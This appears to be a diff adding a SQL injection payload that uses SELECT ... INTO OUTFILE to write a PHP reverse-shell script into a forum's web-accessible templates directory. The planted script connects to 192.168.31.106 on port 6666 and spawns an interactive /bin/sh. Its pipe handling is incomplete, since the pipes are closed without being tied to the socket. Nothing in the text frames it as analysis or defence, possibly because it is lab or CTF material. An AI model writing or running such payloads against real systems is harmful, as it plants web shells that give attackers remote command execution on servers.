@@ -1,0 +1,15 @@
+SELECT '<?php
+$sock = fsockopen("192.168.31.106", 6666);
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+$process = proc_open("/bin/sh -i", $descriptorspec, $pipes);
+if (is_resource($process)) {
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    proc_close($process);
+}
+?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
